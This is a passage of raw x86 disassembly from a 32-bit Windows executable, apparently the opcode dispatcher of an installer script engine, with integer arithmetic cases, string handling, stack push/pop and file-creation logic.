  4016ce:	e9 4a 0c 00 00       	jmp    0x40231d
  4016d3:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4016d6:	0f 84 7e 12 00 00    	je     0x40295a
  4016dc:	56                   	push   %esi
  4016dd:	e8 04 52 00 00       	call   0x4068e6
  4016e2:	85 c0                	test   %eax,%eax
  4016e4:	0f 84 70 12 00 00    	je     0x40295a
  4016ea:	57                   	push   %edi
  4016eb:	56                   	push   %esi
  4016ec:	e8 58 4c 00 00       	call   0x406349
  4016f1:	6a e4                	push   $0xffffffe4
  4016f3:	e9 25 0c 00 00       	jmp    0x40231d
  4016f8:	53                   	push   %ebx
  4016f9:	e8 d4 16 00 00       	call   0x402dd2
  4016fe:	8b 7d f4             	mov    -0xc(%ebp),%edi
  401701:	8b f0                	mov    %eax,%esi
  401703:	8d 45 08             	lea    0x8(%ebp),%eax
  401706:	50                   	push   %eax
  401707:	57                   	push   %edi
  401708:	68 00 04 00 00       	push   $0x400
  40170d:	56                   	push   %esi
  40170e:	ff 15 e8 80 40 00    	call   *0x4080e8
  401714:	85 c0                	test   %eax,%eax
  401716:	74 24                	je     0x40173c
  401718:	8b 45 08             	mov    0x8(%ebp),%eax
  40171b:	3b c6                	cmp    %esi,%eax
  40171d:	76 27                	jbe    0x401746
  40171f:	66 39 18             	cmp    %bx,(%eax)
  401722:	74 22                	je     0x401746
  401724:	56                   	push   %esi
  401725:	e8 bc 51 00 00       	call   0x4068e6
  40172a:	3b c3                	cmp    %ebx,%eax
  40172c:	74 0e                	je     0x40173c
  40172e:	83 c0 2c             	add    $0x2c,%eax
  401731:	50                   	push   %eax
  401732:	ff 75 08             	push   0x8(%ebp)
  401735:	e8 4f 4e 00 00       	call   0x406589
  40173a:	eb 0a                	jmp    0x401746
  40173c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401743:	66 89 1f             	mov    %bx,(%edi)
  401746:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401749:	0f 85 07 15 00 00    	jne    0x402c56
  40174f:	68 00 04 00 00       	push   $0x400
  401754:	57                   	push   %edi
  401755:	57                   	push   %edi
  401756:	ff 15 ec 80 40 00    	call   *0x4080ec
  40175c:	e9 f5 14 00 00       	jmp    0x402c56
  401761:	6a ff                	push   $0xffffffff
  401763:	e8 6a 16 00 00       	call   0x402dd2
  401768:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40176b:	51                   	push   %ecx
  40176c:	57                   	push   %edi
  40176d:	68 00 04 00 00       	push   $0x400
  401772:	53                   	push   %ebx
  401773:	50                   	push   %eax
  401774:	53                   	push   %ebx
  401775:	ff 15 f0 80 40 00    	call   *0x4080f0
  40177b:	85 c0                	test   %eax,%eax
  40177d:	0f 85 d3 14 00 00    	jne    0x402c56
  401783:	e9 a0 11 00 00       	jmp    0x402928
  401788:	6a ef                	push   $0xffffffef
  40178a:	e8 43 16 00 00       	call   0x402dd2
  40178f:	50                   	push   %eax
  401790:	57                   	push   %edi
  401791:	e8 12 49 00 00       	call   0x4060a8
  401796:	e9 3e fe ff ff       	jmp    0x4015d9
  40179b:	6a 31                	push   $0x31
  40179d:	e8 30 16 00 00       	call   0x402dd2
  4017a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4017a5:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4017a8:	ff 75 f8             	push   -0x8(%ebp)
  4017ab:	83 e0 07             	and    $0x7,%eax
  4017ae:	89 45 08             	mov    %eax,0x8(%ebp)
  4017b1:	e8 19 47 00 00       	call   0x405ecf
  4017b6:	ff 75 f8             	push   -0x8(%ebp)
  4017b9:	bf c8 a5 40 00       	mov    $0x40a5c8,%edi
  4017be:	85 c0                	test   %eax,%eax
  4017c0:	74 08                	je     0x4017ca
  4017c2:	57                   	push   %edi
  4017c3:	e8 c1 4d 00 00       	call   0x406589
  4017c8:	eb 17                	jmp    0x4017e1
  4017ca:	68 00 50 43 00       	push   $0x435000
  4017cf:	57                   	push   %edi
  4017d0:	e8 b4 4d 00 00       	call   0x406589
  4017d5:	50                   	push   %eax
  4017d6:	e8 7d 46 00 00       	call   0x405e58
  4017db:	50                   	push   %eax
  4017dc:	e8 c4 4d 00 00       	call   0x4065a5
  4017e1:	57                   	push   %edi
  4017e2:	e8 50 50 00 00       	call   0x406837
  4017e7:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017eb:	7c 31                	jl     0x40181e
  4017ed:	57                   	push   %edi
  4017ee:	e8 f3 50 00 00       	call   0x4068e6
  4017f3:	33 c9                	xor    %ecx,%ecx
  4017f5:	3b c3                	cmp    %ebx,%eax
  4017f7:	74 10                	je     0x401809
  4017f9:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4017fc:	83 c0 14             	add    $0x14,%eax
  4017ff:	51                   	push   %ecx
  401800:	50                   	push   %eax
  401801:	ff 15 f4 80 40 00    	call   *0x4080f4
  401807:	8b c8                	mov    %eax,%ecx
  401809:	8b 45 08             	mov    0x8(%ebp),%eax
  40180c:	83 c0 fd             	add    $0xfffffffd,%eax
  40180f:	0d 00 00 00 80       	or     $0x80000000,%eax
  401814:	23 c1                	and    %ecx,%eax
  401816:	f7 d8                	neg    %eax
  401818:	1b c0                	sbb    %eax,%eax
  40181a:	40                   	inc    %eax
  40181b:	89 45 08             	mov    %eax,0x8(%ebp)
  40181e:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401821:	75 06                	jne    0x401829
  401823:	57                   	push   %edi
  401824:	e8 2b 48 00 00       	call   0x406054
  401829:	33 c0                	xor    %eax,%eax
  40182b:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40182f:	0f 95 c0             	setne  %al
  401832:	40                   	inc    %eax
  401833:	50                   	push   %eax
  401834:	68 00 00 00 40       	push   $0x40000000
  401839:	57                   	push   %edi
  40183a:	e8 3a 48 00 00       	call   0x406079
  40183f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401842:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401845:	75 72                	jne    0x4018b9
  401847:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40184a:	75 4f                	jne    0x40189b
  40184c:	56                   	push   %esi
  40184d:	68 c8 b5 40 00       	push   $0x40b5c8
  401852:	e8 32 4d 00 00       	call   0x406589
  401857:	57                   	push   %edi
  401858:	56                   	push   %esi
  401859:	e8 2b 4d 00 00       	call   0x406589
  40185e:	ff 75 e4             	push   -0x1c(%ebp)
  401861:	68 c8 ad 40 00       	push   $0x40adc8
  401866:	e8 5b 4d 00 00       	call   0x4065c6
  40186b:	68 c8 b5 40 00       	push   $0x40b5c8
  401870:	56                   	push   %esi
  401871:	e8 13 4d 00 00       	call   0x406589
  401876:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401879:	c1 f8 03             	sar    $0x3,%eax
  40187c:	50                   	push   %eax
  40187d:	68 c8 ad 40 00       	push   $0x40adc8
  401882:	e8 62 43 00 00       	call   0x405be9
  401887:	83 e8 04             	sub    $0x4,%eax
  40188a:	0f 84 57 ff ff ff    	je     0x4017e7
  401890:	48                   	dec    %eax
  401891:	74 1b                	je     0x4018ae
  401893:	57                   	push   %edi
  401894:	6a fa                	push   $0xfffffffa
  401896:	e9 f8 fb ff ff       	jmp    0x401493
  40189b:	ff 75 f8             	push   -0x8(%ebp)
  40189e:	6a e2                	push   $0xffffffe2
  4018a0:	e8 69 3d 00 00       	call   0x40560e
  4018a5:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4018a9:	e9 2d fd ff ff       	jmp    0x4015db
  4018ae:	ff 05 a8 9a 42 00    	incl   0x429aa8
  4018b4:	e9 a6 13 00 00       	jmp    0x402c5f
  4018b9:	ff 75 f8             	push   -0x8(%ebp)
  4018bc:	6a ea                	push   $0xffffffea
  4018be:	e8 4b 3d 00 00       	call   0x40560e
  4018c3:	ff 05 d4 9a 42 00    	incl   0x429ad4
  4018c9:	53                   	push   %ebx
  4018ca:	53                   	push   %ebx
  4018cb:	ff 75 c8             	push   -0x38(%ebp)
  4018ce:	ff 75 d8             	push   -0x28(%ebp)
  4018d1:	e8 3e 1a 00 00       	call   0x403314
  4018d6:	ff 0d d4 9a 42 00    	decl   0x429ad4
  4018dc:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018e0:	8b f0                	mov    %eax,%esi
  4018e2:	75 06                	jne    0x4018ea
  4018e4:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  4018e8:	74 12                	je     0x4018fc
  4018ea:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018ed:	50                   	push   %eax
  4018ee:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018f1:	53                   	push   %ebx
  4018f2:	50                   	push   %eax
  4018f3:	ff 75 c8             	push   -0x38(%ebp)
  4018f6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018fc:	ff 75 c8             	push   -0x38(%ebp)
  4018ff:	ff 15 fc 80 40 00    	call   *0x4080fc
  401905:	3b f3                	cmp    %ebx,%esi
  401907:	0f 8d 49 13 00 00    	jge    0x402c56
  40190d:	83 fe fe             	cmp    $0xfffffffe,%esi
  401910:	75 13                	jne    0x401925
  401912:	6a e9                	push   $0xffffffe9
  401914:	57                   	push   %edi
  401915:	e8 ac 4c 00 00       	call   0x4065c6
  40191a:	ff 75 f8             	push   -0x8(%ebp)
  40191d:	57                   	push   %edi
  40191e:	e8 82 4c 00 00       	call   0x4065a5
  401923:	eb 08                	jmp    0x40192d
  401925:	6a ee                	push   $0xffffffee
  401927:	57                   	push   %edi
  401928:	e8 99 4c 00 00       	call   0x4065c6
  40192d:	68 10 00 20 00       	push   $0x200010
  401932:	57                   	push   %edi
  401933:	e9 8c 0a 00 00       	jmp    0x4023c4
  401938:	53                   	push   %ebx
  401939:	eb 34                	jmp    0x40196f
  40193b:	6a 31                	push   $0x31
  40193d:	e8 90 14 00 00       	call   0x402dd2
  401942:	ff 75 d0             	push   -0x30(%ebp)
  401945:	50                   	push   %eax
  401946:	e8 9e 42 00 00       	call   0x405be9
  40194b:	3b c3                	cmp    %ebx,%eax
  40194d:	0f 84 07 10 00 00    	je     0x40295a
  401953:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  401956:	0f 84 6c 01 00 00    	je     0x401ac8
  40195c:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40195f:	0f 85 f1 12 00 00    	jne    0x402c56
  401965:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401968:	e9 f4 12 00 00       	jmp    0x402c61
  40196d:	6a f0                	push   $0xfffffff0
  40196f:	e8 5e 14 00 00       	call   0x402dd2
  401974:	ff 75 d4             	push   -0x2c(%ebp)
  401977:	50                   	push   %eax
  401978:	e8 18 43 00 00       	call   0x405c95
  40197d:	e9 d4 12 00 00       	jmp    0x402c56
  401982:	6a 01                	push   $0x1
  401984:	e8 49 14 00 00       	call   0x402dd2
  401989:	50                   	push   %eax
  40198a:	e8 10 4c 00 00       	call   0x40659f
  40198f:	e9 d0 0c 00 00       	jmp    0x402664
  401994:	6a 02                	push   $0x2
  401996:	e8 15 14 00 00       	call   0x402db0
  40199b:	6a 03                	push   $0x3
  40199d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4019a0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4019a3:	e8 08 14 00 00       	call   0x402db0
  4019a8:	59                   	pop    %ecx
  4019a9:	8b f0                	mov    %eax,%esi
  4019ab:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4019ae:	59                   	pop    %ecx
  4019af:	6a 01                	push   $0x1
  4019b1:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4019b4:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4019b7:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ba:	e8 13 14 00 00       	call   0x402dd2
  4019bf:	50                   	push   %eax
  4019c0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4019c3:	e8 d7 4b 00 00       	call   0x40659f
  4019c8:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4019cb:	66 89 1f             	mov    %bx,(%edi)
  4019ce:	75 03                	jne    0x4019d3
  4019d0:	89 45 08             	mov    %eax,0x8(%ebp)
  4019d3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019d6:	0f 84 7a 12 00 00    	je     0x402c56
  4019dc:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4019df:	3b cb                	cmp    %ebx,%ecx
  4019e1:	7d 0b                	jge    0x4019ee
  4019e3:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  4019e6:	3b f3                	cmp    %ebx,%esi
  4019e8:	0f 8c 68 12 00 00    	jl     0x402c56
  4019ee:	3b f0                	cmp    %eax,%esi
  4019f0:	7e 02                	jle    0x4019f4
  4019f2:	8b f0                	mov    %eax,%esi
  4019f4:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4019f7:	8d 04 70             	lea    (%eax,%esi,2),%eax
  4019fa:	50                   	push   %eax
  4019fb:	57                   	push   %edi
  4019fc:	e8 88 4b 00 00       	call   0x406589
  401a01:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  401a04:	7d 0e                	jge    0x401a14
  401a06:	57                   	push   %edi
  401a07:	e8 93 4b 00 00       	call   0x40659f
  401a0c:	01 45 08             	add    %eax,0x8(%ebp)
  401a0f:	79 03                	jns    0x401a14
  401a11:	89 5d 08             	mov    %ebx,0x8(%ebp)
  401a14:	8b 45 08             	mov    0x8(%ebp),%eax
  401a17:	3d 00 04 00 00       	cmp    $0x400,%eax
  401a1c:	0f 8d 34 12 00 00    	jge    0x402c56
  401a22:	66 89 1c 47          	mov    %bx,(%edi,%eax,2)
  401a26:	e9 2b 12 00 00       	jmp    0x402c56
  401a2b:	6a 20                	push   $0x20
  401a2d:	e8 a0 13 00 00       	call   0x402dd2
  401a32:	6a 31                	push   $0x31
  401a34:	8b f0                	mov    %eax,%esi
  401a36:	e8 97 13 00 00       	call   0x402dd2
  401a3b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401a3e:	50                   	push   %eax
  401a3f:	56                   	push   %esi
  401a40:	75 12                	jne    0x401a54
  401a42:	ff 15 00 81 40 00    	call   *0x408100
  401a48:	85 c0                	test   %eax,%eax
  401a4a:	75 7c                	jne    0x401ac8
  401a4c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a4f:	e9 0d 12 00 00       	jmp    0x402c61
  401a54:	ff 15 04 81 40 00    	call   *0x408104
  401a5a:	eb ec                	jmp    0x401a48
  401a5c:	33 f6                	xor    %esi,%esi
  401a5e:	46                   	inc    %esi
  401a5f:	56                   	push   %esi
  401a60:	e8 6d 13 00 00       	call   0x402dd2
  401a65:	68 00 04 00 00       	push   $0x400
  401a6a:	57                   	push   %edi
  401a6b:	50                   	push   %eax
  401a6c:	89 45 08             	mov    %eax,0x8(%ebp)
  401a6f:	ff 15 08 81 40 00    	call   *0x408108
  401a75:	85 c0                	test   %eax,%eax
  401a77:	74 13                	je     0x401a8c
  401a79:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401a7c:	74 14                	je     0x401a92
  401a7e:	57                   	push   %edi
  401a7f:	ff 75 08             	push   0x8(%ebp)
  401a82:	ff 15 04 81 40 00    	call   *0x408104
  401a88:	85 c0                	test   %eax,%eax
  401a8a:	75 06                	jne    0x401a92
  401a8c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401a8f:	66 89 1f             	mov    %bx,(%edi)
  401a92:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  401a99:	e9 b8 11 00 00       	jmp    0x402c56
  401a9e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  401aa1:	53                   	push   %ebx
  401aa2:	e8 09 13 00 00       	call   0x402db0
  401aa7:	6a 01                	push   $0x1
  401aa9:	8b f8                	mov    %eax,%edi
  401aab:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aae:	e8 fd 12 00 00       	call   0x402db0
  401ab3:	59                   	pop    %ecx
  401ab4:	3b f3                	cmp    %ebx,%esi
  401ab6:	59                   	pop    %ecx
  401ab7:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aba:	75 08                	jne    0x401ac4
  401abc:	3b f8                	cmp    %eax,%edi
  401abe:	7c 08                	jl     0x401ac8
  401ac0:	7e 8a                	jle    0x401a4c
  401ac2:	eb 12                	jmp    0x401ad6
  401ac4:	3b f8                	cmp    %eax,%edi
  401ac6:	73 08                	jae    0x401ad0
  401ac8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401acb:	e9 91 11 00 00       	jmp    0x402c61
  401ad0:	0f 86 76 ff ff ff    	jbe    0x401a4c
  401ad6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ad9:	e9 83 11 00 00       	jmp    0x402c61
  401ade:	6a 01                	push   $0x1
  401ae0:	e8 cb 12 00 00       	call   0x402db0
  401ae5:	8b f0                	mov    %eax,%esi
  401ae7:	6a 02                	push   $0x2
  401ae9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aec:	89 75 08             	mov    %esi,0x8(%ebp)
  401aef:	e8 bc 12 00 00       	call   0x402db0
  401af4:	59                   	pop    %ecx
  401af5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401af8:	59                   	pop    %ecx
  401af9:	8b c8                	mov    %eax,%ecx
  401afb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401afe:	83 f8 0d             	cmp    $0xd,%eax
  401b01:	0f 87 94 00 00 00    	ja     0x401b9b
  401b07:	ff 24 85 78 2d 40 00 	jmp    *0x402d78(,%eax,4)
  401b0e:	03 f1                	add    %ecx,%esi
  401b10:	e9 5f 03 00 00       	jmp    0x401e74
  401b15:	2b f1                	sub    %ecx,%esi
  401b17:	e9 58 03 00 00       	jmp    0x401e74
  401b1c:	0f af ce             	imul   %esi,%ecx
  401b1f:	eb 1a                	jmp    0x401b3b
  401b21:	3b cb                	cmp    %ebx,%ecx
  401b23:	74 53                	je     0x401b78
  401b25:	8b c6                	mov    %esi,%eax
  401b27:	99                   	cltd
  401b28:	f7 f9                	idiv   %ecx
  401b2a:	8b f0                	mov    %eax,%esi
  401b2c:	e9 43 03 00 00       	jmp    0x401e74
  401b31:	0b ce                	or     %esi,%ecx
  401b33:	eb 06                	jmp    0x401b3b
  401b35:	23 ce                	and    %esi,%ecx
  401b37:	eb 02                	jmp    0x401b3b
  401b39:	33 ce                	xor    %esi,%ecx
  401b3b:	8b f1                	mov    %ecx,%esi
  401b3d:	e9 32 03 00 00       	jmp    0x401e74
  401b42:	33 c0                	xor    %eax,%eax
  401b44:	3b f3                	cmp    %ebx,%esi
  401b46:	0f 94 c0             	sete   %al
  401b49:	eb df                	jmp    0x401b2a
  401b4b:	3b f3                	cmp    %ebx,%esi
  401b4d:	75 11                	jne    0x401b60
  401b4f:	eb 0b                	jmp    0x401b5c
  401b51:	33 f6                	xor    %esi,%esi
  401b53:	e9 1c 03 00 00       	jmp    0x401e74
  401b58:	3b f3                	cmp    %ebx,%esi
  401b5a:	74 f5                	je     0x401b51
  401b5c:	3b cb                	cmp    %ebx,%ecx
  401b5e:	74 f1                	je     0x401b51
  401b60:	33 f6                	xor    %esi,%esi
  401b62:	46                   	inc    %esi
  401b63:	e9 0c 03 00 00       	jmp    0x401e74
  401b68:	3b cb                	cmp    %ebx,%ecx
  401b6a:	74 0c                	je     0x401b78
  401b6c:	8b c6                	mov    %esi,%eax
  401b6e:	99                   	cltd
  401b6f:	f7 f9                	idiv   %ecx
  401b71:	8b f2                	mov    %edx,%esi
  401b73:	e9 fc 02 00 00       	jmp    0x401e74
  401b78:	33 f6                	xor    %esi,%esi
  401b7a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b81:	e9 ee 02 00 00       	jmp    0x401e74
  401b86:	d3 e6                	shl    %cl,%esi
  401b88:	e9 e7 02 00 00       	jmp    0x401e74
  401b8d:	d3 fe                	sar    %cl,%esi
  401b8f:	e9 e0 02 00 00       	jmp    0x401e74
  401b94:	d3 ee                	shr    %cl,%esi
  401b96:	e9 d9 02 00 00       	jmp    0x401e74
  401b9b:	8b 75 08             	mov    0x8(%ebp),%esi
  401b9e:	e9 d1 02 00 00       	jmp    0x401e74
  401ba3:	6a 01                	push   $0x1
  401ba5:	e8 28 12 00 00       	call   0x402dd2
  401baa:	6a 02                	push   $0x2
  401bac:	8b f0                	mov    %eax,%esi
  401bae:	e8 fd 11 00 00       	call   0x402db0
  401bb3:	50                   	push   %eax
  401bb4:	56                   	push   %esi
  401bb5:	57                   	push   %edi
  401bb6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401bb9:	ff 15 2c 82 40 00    	call   *0x40822c
  401bbf:	83 c4 10             	add    $0x10,%esp
  401bc2:	e9 8f 10 00 00       	jmp    0x402c56
  401bc7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401bca:	8b 35 28 ce 40 00    	mov    0x40ce28,%esi
  401bd0:	3b c3                	cmp    %ebx,%eax
  401bd2:	74 44                	je     0x401c18
  401bd4:	48                   	dec    %eax
  401bd5:	3b f3                	cmp    %ebx,%esi
  401bd7:	0f 84 d9 07 00 00    	je     0x4023b6
  401bdd:	8b 36                	mov    (%esi),%esi
  401bdf:	3b c3                	cmp    %ebx,%eax
  401be1:	75 f1                	jne    0x401bd4
  401be3:	3b f3                	cmp    %ebx,%esi
  401be5:	0f 84 cb 07 00 00    	je     0x4023b6
  401beb:	83 c6 04             	add    $0x4,%esi
  401bee:	bf c8 a5 40 00       	mov    $0x40a5c8,%edi
  401bf3:	56                   	push   %esi
  401bf4:	57                   	push   %edi
  401bf5:	e8 8f 49 00 00       	call   0x406589
  401bfa:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  401bff:	83 c0 04             	add    $0x4,%eax
  401c02:	50                   	push   %eax
  401c03:	56                   	push   %esi
  401c04:	e8 80 49 00 00       	call   0x406589
  401c09:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  401c0e:	57                   	push   %edi
  401c0f:	83 c0 04             	add    $0x4,%eax
  401c12:	50                   	push   %eax
  401c13:	e9 a8 0e 00 00       	jmp    0x402ac0
  401c18:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401c1b:	74 25                	je     0x401c42
  401c1d:	3b f3                	cmp    %ebx,%esi
  401c1f:	0f 84 35 0d 00 00    	je     0x40295a
  401c25:	8d 46 04             	lea    0x4(%esi),%eax
  401c28:	50                   	push   %eax
  401c29:	57                   	push   %edi
  401c2a:	e8 5a 49 00 00       	call   0x406589
  401c2f:	8b 06                	mov    (%esi),%eax
  401c31:	56                   	push   %esi
  401c32:	a3 28 ce 40 00       	mov    %eax,0x40ce28
  401c37:	ff 15 0c 81 40 00    	call   *0x40810c
  401c3d:	e9 14 10 00 00       	jmp    0x402c56
  401c42:	68 04 08 00 00       	push   $0x804
  401c47:	6a 40                	push   $0x40
  401c49:	ff 15 10 81 40 00    	call   *0x408110
  401c4f:	ff 75 d0             	push   -0x30(%ebp)
  401c52:	8b f0                	mov    %eax,%esi
  401c54:	8d 46 04             	lea    0x4(%esi),%eax
  401c57:	50                   	push   %eax
  401c58:	e8 69 49 00 00       	call   0x4065c6
  401c5d:	a1 28 ce 40 00       	mov    0x40ce28,%eax
  401c62:	89 06                	mov    %eax,(%esi)
  401c64:	89 35 28 ce 40 00    	mov    %esi,0x40ce28
  401c6a:	e9 e7 0f 00 00       	jmp    0x402c56
  401c6f:	6a 03                	push   $0x3
  401c71:	e8 3a 11 00 00       	call   0x402db0
  401c76:	6a 04                	push   $0x4
  401c78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c7b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c7e:	e8 2d 11 00 00       	call   0x402db0
  401c83:	f6 45 e4 01          	testb  $0x1,-0x1c(%ebp)
  401c87:	59                   	pop    %ecx
  401c88:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c8b:	59                   	pop    %ecx
  401c8c:	89 45 08             	mov    %eax,0x8(%ebp)
  401c8f:	74 0a                	je     0x401c9b
  401c91:	6a 33                	push   $0x33
  401c93:	e8 3a 11 00 00       	call   0x402dd2
  401c98:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401c9b:	f6 45 e4 02          	testb  $0x2,-0x1c(%ebp)
  401c9f:	74 0a                	je     0x401cab
  401ca1:	6a 44                	push   $0x44
  401ca3:	e8 2a 11 00 00       	call   0x402dd2
  401ca8:	89 45 08             	mov    %eax,0x8(%ebp)
  401cab:	83 7d cc 21          	cmpl   $0x21,-0x34(%ebp)
  401caf:	6a 01                	push   $0x1
  401cb1:	75 4c                	jne    0x401cff
  401cb3:	e8 f8 10 00 00       	call   0x402db0
  401cb8:	6a 02                	push   $0x2
  401cba:	8b f0                	mov    %eax,%esi
  401cbc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cbf:	e8 ec 10 00 00       	call   0x402db0
  401cc4:	59                   	pop    %ecx
  401cc5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401cc8:	59                   	pop    %ecx
  401cc9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401ccc:	c1 f9 02             	sar    $0x2,%ecx
  401ccf:	74 1e                	je     0x401cef
  401cd1:	8d 55 c8             	lea    -0x38(%ebp),%edx
  401cd4:	52                   	push   %edx
  401cd5:	51                   	push   %ecx
  401cd6:	53                   	push   %ebx
  401cd7:	ff 75 08             	push   0x8(%ebp)
  401cda:	ff 75 e8             	push   -0x18(%ebp)
  401cdd:	50                   	push   %eax
  401cde:	56                   	push   %esi
  401cdf:	ff 15 30 82 40 00    	call   *0x408230
  401ce5:	f7 d8                	neg    %eax
  401ce7:	1b c0                	sbb    %eax,%eax
  401ce9:	40                   	inc    %eax
  401cea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ced:	eb 43                	jmp    0x401d32
  401cef:	ff 75 08             	push   0x8(%ebp)
  401cf2:	ff 75 e8             	push   -0x18(%ebp)
  401cf5:	50                   	push   %eax
  401cf6:	56                   	push   %esi
  401cf7:	ff 15 58 82 40 00    	call   *0x408258
  401cfd:	eb 30                	jmp    0x401d2f
  401cff:	e8 ce 10 00 00       	call   0x402dd2
  401d04:	6a 12                	push   $0x12
  401d06:	8b f0                	mov    %eax,%esi
  401d08:	e8 c5 10 00 00       	call   0x402dd2
  401d0d:	66 8b 08             	mov    (%eax),%cx
  401d10:	66 f7 d9             	neg    %cx
  401d13:	1b c9                	sbb    %ecx,%ecx
  401d15:	23 c8                	and    %eax,%ecx
  401d17:	66 8b 06             	mov    (%esi),%ax
  401d1a:	66 f7 d8             	neg    %ax
  401d1d:	1b c0                	sbb    %eax,%eax
  401d1f:	51                   	push   %ecx
  401d20:	23 c6                	and    %esi,%eax
  401d22:	50                   	push   %eax
  401d23:	ff 75 08             	push   0x8(%ebp)
  401d26:	ff 75 e8             	push   -0x18(%ebp)
  401d29:	ff 15 34 82 40 00    	call   *0x408234
  401d2f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401d32:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401d35:	0f 8c 1b 0f 00 00    	jl     0x402c56
  401d3b:	ff 75 c8             	push   -0x38(%ebp)
  401d3e:	e9 4f f8 ff ff       	jmp    0x401592
  401d43:	53                   	push   %ebx
  401d44:	e8 67 10 00 00       	call   0x402db0
  401d49:	59                   	pop    %ecx
  401d4a:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d4d:	50                   	push   %eax
  401d4e:	ff 15 38 82 40 00    	call   *0x408238
  401d54:	85 c0                	test   %eax,%eax
  401d56:	0f 84 f0 fc ff ff    	je     0x401a4c
  401d5c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401d5f:	e9 fd 0e 00 00       	jmp    0x402c61
  401d64:	6a 02                	push   $0x2
  401d66:	e8 45 10 00 00       	call   0x402db0
  401d6b:	6a 01                	push   $0x1
  401d6d:	8b f0                	mov    %eax,%esi
  401d6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d72:	e8 39 10 00 00       	call   0x402db0
  401d77:	59                   	pop    %ecx
  401d78:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d7b:	59                   	pop    %ecx
  401d7c:	56                   	push   %esi
  401d7d:	50                   	push   %eax
  401d7e:	ff 15 3c 82 40 00    	call   *0x40823c
  401d84:	e9 db 08 00 00       	jmp    0x402664
  401d89:	a1 68 9a 42 00       	mov    0x429a68,%eax
  401d8e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d91:	53                   	push   %ebx
  401d92:	8d 34 08             	lea    (%eax,%ecx,1),%esi
  401d95:	e8 16 10 00 00       	call   0x402db0
  401d9a:	59                   	pop    %ecx
  401d9b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d9e:	56                   	push   %esi
  401d9f:	6a eb                	push   $0xffffffeb
  401da1:	50                   	push   %eax
  401da2:	ff 15 40 82 40 00    	call   *0x408240
  401da8:	e9 a9 0e 00 00       	jmp    0x402c56
  401dad:	f6 45 dd 01          	testb  $0x1,-0x23(%ebp)
  401db1:	74 0d                	je     0x401dc0
  401db3:	6a 02                	push   $0x2
  401db5:	e8 f6 0f 00 00       	call   0x402db0
  401dba:	59                   	pop    %ecx
  401dbb:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401dbe:	eb 0c                	jmp    0x401dcc
  401dc0:	ff 75 d8             	push   -0x28(%ebp)
  401dc3:	ff 75 f8             	push   -0x8(%ebp)
  401dc6:	ff 15 3c 82 40 00    	call   *0x40823c
  401dcc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401dcf:	89 45 08             	mov    %eax,0x8(%ebp)
